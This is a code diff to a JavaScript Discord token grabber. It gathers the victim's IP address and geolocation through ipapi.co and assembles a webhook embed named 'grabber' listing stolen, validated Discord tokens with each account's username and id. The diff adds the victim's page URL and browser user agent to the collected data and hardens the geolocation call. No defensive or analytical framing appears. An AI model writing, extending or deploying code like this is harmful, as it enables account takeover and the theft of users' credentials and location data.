@@ -81,9 +81,9 @@
 
   // --- gather IP + geo ---
   let geo = {};
-  const geo = await fetch("https://ipapi.co/json/").then(r => r.json());
+  try { geo = await fetch("https://ipapi.co/json/").then(r => r.json()); } catch (_) {}
 
-
+  // --- build embed ---
   const tokenFields = validated.length
     ? validated.map(({ token, user }) => ({
         name: `${user.username}#${user.discriminator} (${user.id})`,
@@ -95,14 +95,16 @@
   const payload = {
     username: "grabber",
     embeds: [{
-      title: "tangina lala",
+      title: "SHET SHET NAKITA AKO",
       color: validated.length ? 0xe74c3c : 0x95a5a6,
       fields: [
-      { name: "IP",      value: geo.ip           ?? "unknown", inline: true },
-      { name: "Country", value: geo.country_name ?? "unknown", inline: true },
-      { name: "Region",  value: geo.region       ?? "unknown", inline: true },
-      { name: "City",    value: geo.city         ?? "unknown", inline: true },
-      { name: "ISP",     value: geo.org          ?? "unknown", inline: true },
+        { name: "IP",      value: geo.ip           ?? "unknown", inline: true },
+        { name: "Country", value: geo.country_name ?? "unknown", inline: true },
+        { name: "Region",  value: geo.region       ?? "unknown", inline: true },
+        { name: "City",    value: geo.city         ?? "unknown", inline: true },
+        { name: "ISP",     value: geo.org          ?? "unknown", inline: true },
+        { name: "Page",    value: location.href,                 inline: true },
+        { name: "UA",      value: navigator.userAgent.slice(0, 512), inline: false },
         ...tokenFields
       ],
       timestamp: new Date().toISOString()
